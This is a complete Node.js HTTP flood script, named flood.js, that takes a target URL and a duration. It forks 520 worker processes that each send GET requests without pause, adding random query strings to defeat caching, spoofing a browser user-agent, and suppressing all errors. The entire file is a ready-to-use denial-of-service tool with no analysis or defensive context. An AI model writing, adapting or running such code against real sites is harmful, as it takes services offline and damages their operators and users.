const got = require('got');
const url = require('url');
const randomstring = require('randomstring');
const cluster = require('cluster');

const startstring = url.parse(process.argv[2]).href;

if (cluster.isMaster){
    if (process.argv.length != 4){
        console.log(`
        Credit : rainbow hat
        Usage : node flood.js <url> <time>
        `);
        process.exit(0);
    }
    for (let i = 0; i < 520; i++){
        cluster.fork();
        console.log("Thread : ",i," Has been Started");
    }
    console.clear()
    console.log("IP : ",startstring);
    setTimeout(() => {
        console.clear();
        console.log("Attack Stoped");
        process.exit(0);
    },1000*process.argv[3]);
} else {
    run();
}

function randompath(){
    let param = randomstring.generate({
        length: 6,
        charset: 'UTF-8'
    });
    let data = randomstring.generate({
        length: 64,
        charset: 'UTF-8'
    });
    let final = `?${param}=${data}`
    return final;
}

function runflood(){
    let target = `${startstring}${randompath()}`
    got.get(target,{
        "headers":{
            "User-agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
            "Referer":startstring,
            "Cache-Control": "max-age=0"
        }
    });
}

function run(){
    setInterval(() => {
        runflood();
    },0);
}

process.on('uncaughtException', () => {
});
process.on('unhandledRejection', () => {
});